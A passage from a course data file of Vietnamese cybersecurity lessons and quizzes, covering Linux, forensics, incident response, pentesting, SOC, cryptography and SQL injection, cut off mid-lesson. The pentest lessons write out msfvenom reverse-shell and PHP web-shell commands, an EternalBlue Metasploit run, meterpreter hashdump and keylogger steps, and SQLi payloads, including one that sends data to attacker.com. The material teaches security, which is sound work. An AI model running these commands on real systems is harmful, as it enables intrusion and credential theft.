- \`Ctrl+C\` hủy lệnh đang chạy`,
        estMinutes: 8,
        order: 1,
        exercise: {
          type: "fill-blank",
          question: "Thư mục _____ chứa cấu hình hệ thống. Thư mục _____ chứa log. Lệnh _____ dùng để xem file kể cả file ẩn.",
          correctAnswer: ["/etc", "/var", "ls -la"],
          explanation: "/etc = config, /var = log, ls -la = liệt kê tất cả file kể cả ẩn."
        }
      },
      {
        id: "adv-lesson-3-2",
        title: "Permission — 'khóa cửa' trong Linux",
        summary: "Mỗi file có 3 lớp khóa: chủ sở hữu, nhóm, người khác. Hiểu để biết cách hacker leo thang.",
        analogy: "File trong Linux giống căn hộ: chủ nhà (owner) có chìa chính, nhóm (group) có chìa phụ, người khác (others) không có chìa.",
        content: `## Linux Permission

### 3 loại quyền:
| Ký tự | Nghĩa | Số |
|---|---|---|
| r | Read (đọc) | 4 |
| w | Write (ghi) | 2 |
| x | Execute (chạy) | 1 |

### 3 nhóm đối tượng:
\`\`\`bash
# Ví dụ: rwx r-- r--
#       user group others
#       (7)   (4)   (4)

chmod 744 script.sh  # user: full, group: read, others: read
chmod +x script.sh   # thêm quyền execute
chown user:group file # đổi chủ sở hữu
\`\`\`

### Bảo mật với Permission:

**SUID — quyền đặc biệt nguy hiểm:**
\`\`\`bash
# File có SUID (s ở user execute):
-rwsr-xr-x  1 root root /usr/bin/passwd

# Nếu file có SUID mà thuộc root → chạy file với quyền root!
# Hacker lợi dụng SUID để leo thang (Privilege Escalation)
\`\`\`

### Kiểm tra SUID:
\`\`\`bash
find / -perm -4000 2>/dev/null
\`\`\`
→ Liệt kê file SUID — kiểm tra xem có file lạ không`,
        estMinutes: 10,
        order: 2,
        exercise: {
          type: "true-false",
          question: "Đánh giá về Linux Permission:",
          items: [
            { id: "a", text: "chmod 755 cho phép chủ sở hữu full quyền, người khác chỉ đọc và chạy" },
            { id: "b", text: "File có SUID luôn chạy với quyền của chủ sở hữu file" },
            { id: "c", text: "Quyền mặc định 777 là an toàn cho mọi file" },
          ],
          correctAnswer: ["true", "true", "false"],
          explanation: "755 = 7(rwx) 5(r-x) 5(r-x). SUID chạy với quyền của owner. 777 là không an toàn."
        }
      },
      {
        id: "adv-lesson-3-3",
        title: "Network Tools & Bash Script",
        summary: "Dùng Linux để quét mạng, bắt gói tin, tự động hóa tác vụ bảo mật.",
        analogy: "Linux là 'kho vũ khí' của hacker. Mỗi tool là một vũ khí: nmap (ống nhòm), netstat (bản đồ), tcpdump (máy nghe lén).",
        content: `## Network Tools trên Linux

### Các tool PHẢI biết:
| Tool | Công dụng | Ví dụ |
|---|---|---|
| ping | Kiểm tra kết nối | ping google.com |
| netstat | Xem port đang mở | netstat -tulpn |
| nmap | Quét mạng | nmap -sS 192.168.1.1 |
| tcpdump | Bắt gói tin | tcpdump -i eth0 |
| curl | Gửi HTTP | curl -I https://example.com |
| wget | Tải file | wget https://file.com/tool.sh |

### Bash Script cơ bản:
\`\`\`bash
#!/bin/bash
# Script quét subnet /24

for ip in $(seq 1 254); do
    ping -c 1 -W 1 192.168.1.$ip >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "192.168.1.$ip is ALIVE"
    fi
done
\`\`\`

### Tự động hóa với Cron:
\`\`\`bash
# Chạy script quét mỗi ngày lúc 2h sáng
crontab -e
0 2 * * * /home/learner/scan.sh
\`\`\`

### Mẹo hay:
- \`grep, awk, sed\` — xử lý log mạnh mẽ
- \`iptables\` — firewall trên Linux
- \`ssh-keygen\` — tạo key SSH bảo mật`,
        estMinutes: 10,
        order: 3,
        exercise: {
          type: "fill-blank",
          question: "Lệnh _____ xem port đang mở. Lệnh _____ gửi HTTP request. Trong bash script, dùng vòng lặp _____ để lặp qua dải số.",
          correctAnswer: ["netstat", "curl", "for"],
          explanation: "netstat -tulpn xem port, curl gửi HTTP, for dùng để lặp."
        }
      },
    ],
  },
  {
    id: "adv-module-4",
    title: "Kỹ năng bảo mật chuyên sâu",
    description: "Phân tích malware, Digital Forensics, Bug Bounty, Red Team, Incident Response.",
    goal: "Sẵn sàng cho các chứng chỉ bảo mật thực tế.",
    order: 4,
    lessons: [
      {
        id: "adv-lesson-4-1",
        title: "Phân tích Malware cơ bản",
        summary: "Học cách phân tích file độc hại trong môi trường an toàn — sandbox, static/dynamic analysis.",
        analogy: "Giống bác sĩ giải phẫu: Mổ xẻ 'xác' malware trong phòng thí nghiệm (sandbox) để hiểu cách nó hoạt động.",
        content: `## Phân tích Malware

### Môi trường an toàn (Sandbox):
- **Cuckoo Sandbox**: Tự động phân tích
- **Any.Run**: Online sandbox (chạy malware trong VM thật)
- **Hybrid Analysis**: Free sandbox
- **Luôn dùng VM** — không bao giờ chạy malware trên máy thật

### 2 phương pháp:

**1. Static Analysis — Không chạy, chỉ đọc:**
- \`strings malware.exe\` — tìm chuỗi đáng ngờ
- \`file malware.exe\` — xem loại file
- \`hexdump\` — xem hex

**2. Dynamic Analysis — Chạy trong sandbox:**
- Chạy malware trong VM cô lập
- Dùng Wireshark bắt packet — malware 'gọi về nhà' đâu?
- Dùng Process Monitor — file nào bị thay đổi?

### 5 dấu hiệu malware cơ bản:
1. Kết nối IP lạ (malware 'call home')
2. Tạo file trong /tmp, %TEMP%
3. Ẩn process (rootkit)
4. Modification registry Windows
5. Gửi dữ liệu không mã hóa

### Công cụ phòng thủ:
- VirusTotal — quét file với 60+ antivirus engine
- YARA — viết rule phát hiện malware`,
        estMinutes: 10,
        order: 1,
        exercise: {
          type: "multiple-choice",
          question: "Bạn tìm thấy file lạ 'invoice.exe'. Cách an toàn NHẤT để phân tích?",
          options: [
            "A. Chạy thử trên máy thật để xem nó làm gì",
            "B. Upload lên VirusTotal và phân tích trong sandbox",
            "C. Mở bằng Notepad xem nội dung",
            "D. Xóa ngay không cần quan tâm",
          ],
          correctAnswer: "B",
          explanation: "VirusTotal + sandbox cho phép phân tích an toàn mà không rủi ro lây nhiễm."
        }
      },
      {
        id: "adv-lesson-4-2",
        title: "Digital Forensics — 'khám nghiệm hiện trường'",
        summary: "Khi bị hack, forensics giúp trả lời: Chuyện gì xảy ra? Ai? Khi nào? Làm sao?",
        analogy: "Forensics giống CSI: khám nghiệm hiện trường — tìm dấu vân tay (log), xem camera (network traffic), hỏi nhân chứng (nhật ký hệ thống).",
        content: `## Digital Forensics

### Quy trình 5 bước:
1. **Bảo quản** — chụp RAM, tạo disk image, không tắt máy
2. **Thu thập** — log, file, memory dump, traffic capture
3. **Phân tích** — tìm IOC (Indicator of Compromise)
4. **Báo cáo** — ghi nhận kết quả
5. **Phục hồi** — cleanup, vá lỗ

### Công cụ Forensics:
| Tool | Mục đích |
|---|---|
| Autopsy/Sleuth Kit | Phân tích ổ cứng |
| Volatility | Phân tích RAM (memory forensics) |
| Wireshark | Phân tích network traffic |
| FTK Imager | Tạo disk image |
| Plaso (log2timeline) | Phân tích timeline |

### 3 loại evidence phổ biến:
1. **Log file**: auth.log, syslog, Windows Event Log
2. **Network**: PCAP files từ Wireshark
3. **Memory**: RAM dump — thường chứa malware chưa ghi xuống ổ

### Dấu hiệu bị hack:
- Failed SSH login hàng loạt (brute force)
- File log bị xóa
- Process lạ (tên giả hệ thống)
- Kết nối đến IP không quen`,
        estMinutes: 10,
        order: 2,
        exercise: {
          type: "true-false",
          question: "Đánh giá về Forensics:",
          items: [
            { id: "a", text: "Khi bị hack, việc đầu tiên là tắt máy ngay lập tức" },
            { id: "b", text: "Volatility dùng để phân tích RAM dump" },
            { id: "c", text: "Disk image là bản sao chính xác của ổ cứng" },
          ],
          correctAnswer: ["false", "true", "true"],
          explanation: "Không tắt máy — mất dữ liệu RAM. Volatility phân tích RAM. Disk image là bản sao chính xác."
        }
      },
      {
        id: "adv-lesson-4-3",
        title: "Bug Bounty & Ethical Hacking",
        summary: "Hợp pháp: Các công ty trả tiền cho hacker tìm lỗ hổng. Học cách bắt đầu Bug Bounty.",
        analogy: "Bug Bounty giống mật thám — công ty thuê bạn thử đột nhập văn phòng họ. Nếu tìm được cửa sổ quên khóa, họ trả thưởng.",
        content: `## Bug Bounty

### Các nền tảng Bug Bounty:
- **HackerOne** — Lớn nhất, có Airbnb, Google, PayPal
- **Bugcrowd** — Tesla, Twitter, Atlassian
- **Intigriti** — Châu Âu, nhiều chương trình độc quyền

### Lỗ hổng thường gặp (dễ kiếm tiền):
| Lỗ hổng | Mức thưởng (trung bình) |
|---|---|
| XSS (Reflected) | $50 - $500 |
| SQL Injection | $200 - $2,000 |
| IDOR (lỗi phân quyền) | $500 - $5,000 |
| RCE (Remote Code Execution) | $1,000 - $50,000 |

### Cách bắt đầu:
1. Học tool: Burp Suite, Nmap, Gobuster
2. Chọn mục tiêu nhỏ — chương trình mới mở
3. Recon: quét subdomain, tìm endpoint ẩn
4. Tìm lỗi: thử từ dễ đến khó
5. Báo cáo rõ ràng — Proof of Concept + Video

### Đạo đức:
- **Chỉ test chương trình có cho phép**
- **Không đánh cắp dữ liệu** — chỉ cần chứng minh lỗi
- **Bảo mật thông tin** — không public lỗ khi chưa được vá`,
        estMinutes: 10,
        order: 3,
        exercise: {
          type: "multiple-choice",
          question: "Bạn tìm thấy lỗ hổng trên website của công ty ABC nhưng họ không có chương trình Bug Bounty. Bạn nên làm gì?",
          options: [
            "A. Public lên Twitter để nổi tiếng",
            "B. Liên hệ đội ngũ bảo mật của ABC và báo cáo có trách nhiệm",
            "C. Khai thác để lấy dữ liệu",
            "D. Bán thông tin cho bên thứ ba",
          ],
          correctAnswer: "B",
          explanation: "Responsible Disclosure — báo cáo riêng tư, có trách nhiệm, không public lỗ chưa vá."
        }
      },
      {
        id: "adv-lesson-4-4",
        title: "Incident Response — 'xử lý sự cố'",
        summary: "Khi phát hiện bị hack, làm gì? Học quy trình IR: Phát hiện → Ngăn chặn → Phục hồi → Rút kinh nghiệm.",
        analogy: "Incident Response giống đội cứu hỏa: Phát hiện cháy → Dập lửa → Dọn dẹp → Điều tra nguyên nhân → Lắp báo cháy mới.",
        content: `## Incident Response

### 6 bước IR:
1. **Preparation** — Chuẩn bị trước khi có sự cố
2. **Identification** — Phát hiện, xác nhận bị hack
3. **Containment** — Cô lập, ngăn lây lan
4. **Eradication** — Xóa malware, vá lỗ
5. **Recovery** — Khôi phục từ backup
6. **Lessons Learned** — Rút kinh nghiệm, cải thiện

### Playbook mẫu — Phát hiện Ransomware:
\`\`\`
1. IDENTIFY: File bị mã hóa + message đòi tiền
2. CONTAIN: Ngắt LAN, rút dây mạng
3. ERADICATE: Format ổ, restore từ backup
4. RECOVER: Backup sạch → restore
5. LEARN: Sao lưu offline thường xuyên + training nhân viên
\`\`\`

### Công cụ IR:
| Công cụ | Dùng để |
|---|---|
| Velociraptor | Thu thập evidence từ nhiều máy |
| TheHive | Quản lý case IR |
| MISP | Chia sẻ threat intelligence |
| YARA | Phát hiện malware |

### Checklist sau sự cố:
- [ ] Thay đổi tất cả mật khẩu
- [ ] Rotate API keys, tokens
- [ ] Review log (ai làm gì, khi nào)
- [ ] Vá lỗ hổng bị khai thác
- [ ] Backup sạch`,
        estMinutes: 10,
        order: 4,
        exercise: {
          type: "ordering",
          question: "Sắp xếp đúng thứ tự Incident Response:",
          items: [
            { id: "a", text: "Lessons Learned" },
            { id: "b", text: "Preparation" },
            { id: "c", text: "Recovery" },
            { id: "d", text: "Eradication" },
            { id: "e", text: "Containment" },
            { id: "f", text: "Identification" },
          ],
          correctAnswer: ["b", "f", "e", "d", "c", "a"],
          explanation: "IR đúng: Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned"
        }
      },
    ],
  },
  {
    id: "adv-module-5",
    title: "Penetration Testing",
    description: "Phương pháp luận PTES, Reconnaissance, Exploitation, Post-exploitation, Báo cáo.",
    goal: "Thực hiện được một bài pentest từ A-Z trong môi trường lab.",
    order: 5,
    lessons: [
      {
        id: "adv-lesson-5-1",
        title: "Phương pháp luận Pentest — 'bản đồ tấn công'",
        summary: "Pentest có 7 giai đoạn: Tiếp nhận → Recon → Scanning → Exploit → Post-exploit → Báo cáo.",
        analogy: "Pentest giống như một phi vụ heist trong phim: Nhận hợp đồng (xác định mục tiêu) → Do thám (Recon) → Vẽ bản đồ (Scanning) → Đột nhập (Exploit) → Lấy đồ (Post-exploit) → Rút lui (Báo cáo).",
        content: `## Phương pháp luận Pentest

### 7 giai đoạn của PTES (Penetration Testing Execution Standard):

| Giai đoạn | Công việc | Tool |
|---|---|---|
| 1. Pre-engagement | Ký hợp đồng, xác định scope | - |
| 2. Intelligence Gathering | Thu thập thông tin OSINT | Maltego, theHarvester |
| 3. Threat Modeling | Xác định vector tấn công | - |
| 4. Vulnerability Analysis | Quét lỗ hổng | Nessus, OpenVAS |
| 5. Exploitation | Khai thác lỗ hổng | Metasploit, Burp Suite |
| 6. Post-Exploitation | Leo thang, duy trì truy cập | Mimikatz, Netcat |
| 7. Reporting | Viết báo cáo | - |

### OSINT (Open Source Intelligence):
Thu thập thông tin từ nguồn mở trước khi tấn công:
\`\`\`bash
# Tìm subdomain
theHarvester -d example.com -l 100 -b google

# Tìm thông tin DNS
dig example.com ANY
nslookup example.com

# Tìm email nhân viên
theHarvester -d example.com -b linkedin
\`\`\`

### Quét lỗ hổng với Nmap:
\`\`\`bash
# Quét toàn diện
nmap -sS -sV -O -A -T4 target.com

# Quét với script mặc định
nmap -sC target.com

# Quét tìm lỗ hổng
nmap --script vuln target.com
\`\`\`

### Nguyên tắc đạo đức:
- **Luôn có authorization bằng văn bản**
- **Không vượt quá scope đã thỏa thuận**
- **Bảo mật dữ liệu khách hàng**
- **Báo cáo trung thực, không che giấu lỗi**`,
        estMinutes: 12,
        order: 1,
        exercise: {
          type: "ordering",
          question: "Sắp xếp đúng trình tự 7 giai đoạn PTES:",
          items: [
            { id: "a", text: "Exploitation" },
            { id: "b", text: "Reporting" },
            { id: "c", text: "Intelligence Gathering" },
            { id: "d", text: "Post-Exploitation" },
            { id: "e", text: "Vulnerability Analysis" },
            { id: "f", text: "Pre-engagement" },
            { id: "g", text: "Threat Modeling" },
          ],
          correctAnswer: ["f", "c", "g", "e", "a", "d", "b"],
          explanation: "PTES: Pre-engagement → Intelligence Gathering → Threat Modeling → Vulnerability Analysis → Exploitation → Post-Exploitation → Reporting"
        }
      },
      {
        id: "adv-lesson-5-2",
        title: "Khai thác với Metasploit",
        summary: "Metasploit là framework khai thác lỗ hổng số 1 thế giới. Học cách dùng msfconsole.",
        analogy: "Metasploit giống như kho vũ khí bí mật của James Bond — thay vì phải tự chế tạo từng vũ khí (viết exploit), bạn chỉ cần chọn đúng vũ khí cho nhiệm vụ.",
        content: `## Metasploit Framework

### Cấu trúc cơ bản:
\`\`\`
msfconsole
msf6 > search type:exploit platform:windows CVE-2021
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > show options
msf6 > set RHOSTS 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.10
msf6 > exploit
\`\`\`

### Các khái niệm:
| Thuật ngữ | Ý nghĩa |
|---|---|
| Exploit | Mã khai thác lỗ hổng |
| Payload | Mã chạy sau khi khai thác thành công |
| Meterpreter | Payload mạnh mẽ nhất — shell tương tác |
| LHOST/RHOST | IP máy tấn công/máy nạn nhân |
| LPORT/RPORT | Port máy tấn công/máy nạn nhân |

### Tạo reverse shell với msfvenom:
\`\`\`bash
# Windows executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf

# PHP web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php
\`\`\`

### Post-exploitation với Meterpreter:
\`\`\`
meterpreter > sysinfo          # Thông tin hệ thống
meterpreter > getuid           # User hiện tại
meterpreter > getsystem        # Leo thang lên SYSTEM
meterpreter > hashdump         # Lấy password hashes
meterpreter > screenshot       # Chụp màn hình
meterpreter > keyscan_start    # Keylogger
meterpreter > shell            # Mở shell cmd
meterpreter > download file    # Tải file về
meterpreter > upload file      # Đẩy file lên
\`\`\``,
        estMinutes: 12,
        order: 2,
        exercise: {
          type: "multiple-choice",
          question: "Muốn tạo file EXE chứa reverse shell Meterpreter gửi cho nạn nhân, dùng lệnh nào?",
          options: [
            "A. msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... -f exe > shell.exe",
            "B. gcc -o shell.exe shell.c",
            "C. ping -t 10.0.0.1",
            "D. nmap -sS 192.168.1.1",
          ],
          correctAnswer: "A",
          explanation: "msfvenom tạo payload tùy chỉnh. -p chọn payload, -f exe xuất ra EXE."
        }
      },
      {
        id: "adv-lesson-5-3",
        title: "Web Pentest với Burp Suite",
        summary: "Burp Suite là proxy bắt request/respone để phân tích và tấn công web. 90% pentest web dùng Burp.",
        analogy: "Burp Suite giống máy chụp X-quang cho website — bạn nhìn thấy mọi thứ bên trong: request, response, cookie, parameter, header.",
        content: `## Web Pentest với Burp Suite

### Các component chính:
| Component | Chức năng |
|---|---|
| Proxy | Bắt request/respone giữa browser và server |
| Repeater | Gửi lại request đã chỉnh sửa |
| Intruder | Tự động fuzzing parameter |
| Decoder | Mã hóa/giải mã dữ liệu |
| Sequencer | Phân tích tính ngẫu nhiên của token |
| Scanner | Tự động quét lỗ hổng (bản Pro) |

### Quy trình web pentest cơ bản:
\`\`\`
1. Cấu hình browser proxy → 127.0.0.1:8080
2. Cài CA certificate → xem HTTPS
3. Duyệt web → Burp bắt request
4. Gửi request sang Repeater
5. Sửa parameter → test lỗi
6. Dùng Intruder → brute force parameter
\`\`\`

### Các lỗ hổng web thường gặp:
| Lỗ hổng | Cách test với Burp |
|---|---|
| SQL Injection | Gõ ' OR 1=1 -- vào ô username |
| XSS | Gõ <script>alert(1)</script> |
| IDOR | Sửa ID trong request parameter |
| CSRF | Kiểm tra thiếu token |
| SSTI | Gõ {{7*7}} vào template |

### Ví dụ test SQL Injection:
\`\`\`
Request gốc:
POST /login HTTP/1.1
username=admin&password=secret

Request đã chỉnh sửa:
POST /login HTTP/1.1
username=admin' OR '1'='1&password=secret
\`\`\`

### Lab thực hành:
\`\`\`bash
# Dùng curl tương tự Burp Repeater
curl -X POST https://target.com/login \
  -d "username=admin' OR '1'='1&password=test"
\`\`\``,
        estMinutes: 10,
        order: 3,
        exercise: {
          type: "true-false",
          question: "Đánh giá về Web Pentest:",
          items: [
            { id: "a", text: "Burp Suite cần cài CA certificate để bắt HTTPS" },
            { id: "b", text: "Intruder dùng để gửi request thủ công từng cái một" },
            { id: "c", text: "IDOR là lỗi cho phép truy cập tài nguyên không thuộc quyền" },
          ],
          correctAnswer: ["true", "false", "true"],
          explanation: "CA cert cần để giải mã HTTPS. Intruder là tự động hóa, không phải thủ công. IDOR = Insecure Direct Object Reference."
        }
      },
    ],
  },
  {
    id: "adv-module-6",
    title: "SOC & Mã hóa chuyên sâu",
    description: "Security Operations Center, SIEM, Phân tích log, Mật mã học, Public Key Infrastructure.",
    goal: "Vận hành SOC và hiểu sâu về mã hóa bảo vệ dữ liệu.",
    order: 6,
    lessons: [
      {
        id: "adv-lesson-6-1",
        title: "SOC & SIEM — 'trung tâm chỉ huy' an ninh",
        summary: "SOC là trung tâm giám sát an ninh 24/7. SIEM là hệ thống thu thập và phân tích log tập trung.",
        analogy: "SOC giống như trung tâm chỉ huy NASA — hàng trăm màn hình hiển thị dữ liệu từ khắp nơi, các chuyên viên phân tích từng cảnh báo để phát hiện 'thiên thạch' (tấn công) trước khi nó đâm vào Trái Đất.",
        content: `## SOC & SIEM

### SOC là gì?
Security Operations Center — đội ngũ bảo mật giám sát 24/7, phát hiện và ứng phó sự cố.

### Cấu trúc SOC:
| Vai trò | Trách nhiệm |
|---|---|
| Tier 1 (Analyst) | Theo dõi alert, phân loại, escalate |
| Tier 2 (Hunter) | Điều tra sâu, Threat Hunting |
| Tier 3 (Lead) | Phân tích malware, IR phức tạp |
| SOC Manager | Quản lý đội, báo cáo CISO |

### SIEM — Trái tim của SOC:
- **Splunk** — SIEM số 1 thế giới (đắt nhất)
- **ELK Stack** — Elasticsearch, Logstash, Kibana (open source)
- **QRadar** — IBM SIEM
- **Wazuh** — Open source SIEM + EDR

### Cách phân tích alert trong SIEM:
\`\`\`sql
-- Splunk SPL: Tìm failed login hàng loạt
index=windows EventCode=4625
| stats count by Account_Name, Source_Network_Address
| where count > 10
| sort -count

-- ELK Query: Tìm kết nối đến IP độc hại
source.ip: "10.0.0.*" AND destination.ip: "185.220.*"
\`\`\`

### Playbook phân tích alert:
\`\`\`
ALERT: Failed SSH login > 10 lần trong 5 phút

1. CHECK: Source IP - internal hay external?
2. CHECK: Target - server critical?
3. CHECK: User account - tồn tại không?
4. ACT: Nếu external → block IP trên firewall
5. ACT: Nếu internal → check máy đó có malware?
6. REPORT: Ghi nhận vào case IR
\`\`\`

### 3 loại log quan trọng nhất:
- **Windows Event Log** (Security log 4624, 4625, 4688)
- **Linux Auth Log** (/var/log/auth.log)
- **Web Server Log** (Apache/Nginx access.log)`,
        estMinutes: 12,
        order: 1,
        exercise: {
          type: "multiple-choice",
          question: "Trong SOC, Tier 1 Analyst phát hiện alert Failed Login SSH hàng loạt. Hành động ĐẦU TIÊN là gì?",
          options: [
            "A. Gọi điện báo CISO ngay lập tức",
            "B. Kiểm tra Source IP: internal hay external?",
            "C. Format ổ cứng server",
            "D. Reset password toàn bộ công ty",
          ],
          correctAnswer: "B",
          explanation: "Phân tích source IP trước: external = tấn công từ ngoài (block firewall), internal = máy đã bị compromise."
        }
      },
      {
        id: "adv-lesson-6-2",
        title: "Mật mã học — 'khoa học giữ bí mật'",
        summary: "Mã hóa đối xứng, bất đối xứng, hash, chữ ký số — nền tảng của mọi giao thức bảo mật.",
        analogy: "Mật mã học giống như két sắt ngân hàng: Mã hóa đối xứng là két có 1 chìa (cả khóa và mở). Mã hóa bất đối xứng là két có 2 chìa — 1 để khóa (public), 1 để mở (private). Hash là máy đo vân tay — không thể 'giải ngược'.",
        content: `## Mật mã học (Cryptography)

### 3 trụ cột của mật mã:
1. **Mã hóa (Encryption)** — Giữ bí mật
2. **Hash (Hashing)** — Đảm bảo toàn vẹn
3. **Chữ ký số (Digital Signature)** — Xác thực nguồn gốc

### Mã hóa đối xứng (Symmetric):
\`\`\`bash
# Mã hóa file với AES (OpenSSL)
openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc -k "password"

# Giải mã
openssl enc -d -aes-256-cbc -in secret.enc -out secret.txt -k "password"
\`\`\`

### Mã hóa bất đối xứng (Asymmetric):
\`\`\`bash
# Tạo cặp key RSA
openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -pubout -in private.pem -out public.pem

# Mã hóa với public key (chỉ private key mở được)
openssl pkeyutl -encrypt -pubin -inkey public.pem -in secret.txt -out secret.enc

# Giải mã với private key
openssl pkeyutl -decrypt -inkey private.pem -in secret.enc -out secret.txt
\`\`\`

### Hash — 'dấu vân tay' của dữ liệu:
\`\`\`bash
# Tính hash SHA256
sha256sum file.exe

# MD5 (cũ, không an toàn)
md5sum file.exe

# So sánh file gốc và file tải về
echo "abc123...  file.exe" | sha256sum -c
\`\`\`

### Ứng dụng trong thực tế:
| Kỹ thuật | Dùng trong |
|---|---|
| AES-256 | Mã hóa ổ cứng (BitLocker, FileVault) |
| RSA-2048 | HTTPS, SSH, Email encryption |
| SHA-256 | Blockchain, Xác thực file tải về |
| HMAC | API authentication (JWT) |`,
        estMinutes: 12,
        order: 2,
        exercise: {
          type: "match",
          question: "Ghép thuật toán với ứng dụng:",
          items: [
            { id: "a", text: "AES-256" },
            { id: "b", text: "RSA-2048" },
            { id: "c", text: "SHA-256" },
          ],
          options: ["Mã hóa ổ cứng", "HTTPS handshake", "Xác thực file tải về", "Gửi email"],
          correctAnswer: ["Mã hóa ổ cứng", "HTTPS handshake", "Xác thực file tải về"],
          explanation: "AES = mã hóa ổ cứng (đối xứng). RSA = HTTPS (bất đối xứng). SHA-256 = hash xác thực file."
        }
      },
      {
        id: "adv-lesson-6-3",
        title: "PKI & Chứng chỉ số — 'hệ thống căn cước' Internet",
        summary: "PKI là hạ tầng khóa công khai — nền tảng của HTTPS, email ký số, và mọi giao dịch an toàn.",
        analogy: "PKI giống như hệ thống căn cước công dân: CA (Certificate Authority) là bộ công an cấp CMND. Chứng chỉ số là CMND của bạn. Khi bạn truy cập website, trình duyệt kiểm tra 'CMND' của server để đảm bảo nó không giả mạo.",
        content: `## PKI & Chứng chỉ số

### Thành phần của PKI:
| Thành phần | Vai trò |
|---|---|
| CA (Certificate Authority) | Tổ chức cấp chứng chỉ (DigiCert, Let's Encrypt) |
| Certificate | Chứng chỉ số — chứa public key + thông tin |
| CRL/OCSP | Danh sách thu hồi chứng chỉ |
| Root CA | CA gốc — được trust mặc định trong OS/browser |

### Quy trình HTTPS hoạt động:
\`\`\`
1. Browser kết nối https://example.com
2. Server gửi certificate + public key
3. Browser kiểm tra certificate:
   - Có do CA uy tín cấp không?
   - Còn hạn không?
   - Domain name khớp không?
4. Nếu OK → tạo symmetric key, mã hóa bằng public key
5. Server giải mã bằng private key → bắt đầu truyền mã hóa
\`\`\`

### Các loại chứng chỉ:
| Loại | Xác thực | Giá | Dùng cho |
|---|---|---|---|
| DV (Domain Validated) | Chủ domain | Miễn phí (Let's Encrypt) | Blog, cá nhân |
| OV (Organization Validated) | Doanh nghiệp | ~$200/năm | Doanh nghiệp |
| EV (Extended Validation) | Doanh nghiệp + pháp lý | ~$400/năm | Ngân hàng, lớn |

### Tạo chứng chỉ tự ký (Self-signed):
\`\`\`bash
# Tạo private key + certificate (dùng cho lab)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365

# Xem thông tin certificate
openssl x509 -in cert.pem -text -noout

# Kiểm tra kết nối HTTPS
openssl s_client -connect example.com:443
\`\`\`

### Let's Encrypt — chứng chỉ miễn phí cho mọi người:
\`\`\`bash
# Cài certbot
sudo apt install certbot python3-certbot-nginx

# Lấy chứng chỉ
sudo certbot --nginx -d example.com -d www.example.com

# Tự động gia hạn
sudo certbot renew --dry-run
\`\`\``,
        estMinutes: 10,
        order: 3,
        exercise: {
          type: "true-false",
          question: "Đánh giá về PKI:",
          items: [
            { id: "a", text: "Let's Encrypt cấp chứng chỉ DV miễn phí" },
            { id: "b", text: "Private key có thể chia sẻ công khai" },
            { id: "c", text: "Certificate hết hạn sẽ bị browser báo lỗi" },
          ],
          correctAnswer: ["true", "false", "true"],
          explanation: "Let's Encrypt cấp DV free. Private key phải GIỮ BÍ MẬT. Hết hạn = browser báo lỗi."
        }
      },
    ],
  },
  {
    id: "adv-module-7",
    title: "SQL Injection: Chuyên sâu Thực Chiến",
    description: "Từ newbie thành chuyên gia — hiểu tường tận cơ chế, khai thác và phòng thủ SQL Injection.",
    goal: "Hiểu sâu về SQL Injection từ cơ chế Database, phân tích code, đến kỹ thuật phòng thủ và điều tra sự cố.",
    order: 7,
    lessons: [
      {
        id: "adv-lesson-7-1",
        title: "SQL Injection: Bản chất, Khai thác và Phòng thủ Toàn diện",
        summary: "Một module học tập toàn diện về SQL Injection — từ cơ chế dữ liệu, code lab, đến tình huống thực chiến và ngân hàng câu hỏi đa tầng.",
        analogy: "SQL Injection giống như bạn đưa một tờ đơn cho nhân viên ngân hàng và thay vì ghi 'Rút 1 triệu', bạn ghi 'Rút 1 triệu VÀ CHUYỂN TOÀN BỘ SỐ DƯ CHO TÔI' — nếu nhân viên không kiểm tra, bạn sẽ lấy được tất cả.",
        content: `## PHẦN 1: BÀI HỌC CHUYÊN SÂU\n\n### Bản chất cốt lõi (The Mechanics)\n\nSQL Injection (SQLi) là kỹ thuật tấn công Web Application khai thác lớp giao tiếp giữa ứng dụng và Database. Khi ứng dụng web xây dựng câu truy vấn SQL bằng cách nối chuỗi trực tiếp từ dữ liệu người dùng nhập vào (user input), hacker có thể "thoát" khỏi ngữ cảnh của câu truy vấn gốc và thực thi các mệnh đề SQL độc hại.\n\n#### Data Flow của một Web App dễ tổn thương:\n\n\`\`\`\nTrình duyệt → HTTP Request → Web Server (Node.js/PHP) → String Concatenation → Database Engine → Response\n                                    │\n                            Dữ liệu người dùng\n                            KHÔNG được kiểm tra\n\`\`\`\n\nTại sao lỗi này tồn tại? Về bản chất, SQL và ngôn ngữ lập trình (JavaScript, Python, PHP) là hai hệ thống hoàn toàn khác nhau. Khi developer nối chuỗi, họ đang trộn lẫn **code** (SQL) với **dữ liệu** (user input). Kẻ tấn công lợi dụng điều này để biến dữ liệu thành code.\n\n3 điều kiện để SQL Injection xảy ra:\n\n1. **Untrusted Input** — Dữ liệu từ người dùng (form, URL params, headers) được sử dụng để xây dựng câu SQL.\n2. **Dynamic Construction** — Câu SQL được tạo bằng cách nối chuỗi thay vì dùng Prepared Statements / Parameterized Queries.\n3. **Direct Execution** — Câu truy vấn được gửi thẳng đến Database mà không qua sanitization layer nào.\n\n#### Phân loại SQL Injection:\n\n| Loại | Mô tả | Ví dụ Payload |\n|------|-------|---------------|\n| **In-band (Classic)** | Tấn công và lấy dữ liệu trên cùng kênh | \`' OR 1=1 --\` |\n| **Blind (Inferential)** | Không thấy dữ liệu trực tiếp, phải suy luận qua true/false | \`' AND SUBSTRING((SELECT @@version),1,1)='5\` |\n| **Out-of-band** | Dữ liệu được gửi qua kênh khác (DNS, HTTP) | \`LOAD_FILE(concat('\\\\\\\\',(SELECT @@version),'.attacker.com\\\\\\\\test'))\` |\n\n### Phân tích Code Thực tế (Code Lab Case Study)\n\n#### ĐOẠN CODE DỄ TỔN THƯƠNG (Node.js + 